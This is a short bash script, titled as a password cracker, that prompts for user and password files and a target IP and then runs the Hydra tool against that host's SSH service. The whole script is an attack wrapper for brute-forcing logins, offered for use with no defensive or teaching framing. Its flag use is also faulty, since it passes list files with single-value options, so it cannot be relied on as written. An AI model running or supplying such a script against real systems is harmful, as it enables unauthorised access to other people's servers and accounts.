#!/bin/bash
#
echo "========================"
echo " Password Cracker (bash) "
echo "======================== "
pkg=$(hydra --version | grep Hydra | awk '{print $2}')
if [ "$pkg" == "v9.5" ];then
	read -p "Enter your user txt file: " add
	read -p "Enter your pass txt file: " pas
	read -p "Enter your ip : " a
	hydra -l $add -p $pas ssh://$a -vV -f
else
	echo "[!] Hydra is not installed. Please install it using: sudo apt install hydra"
	exit 1
fi  


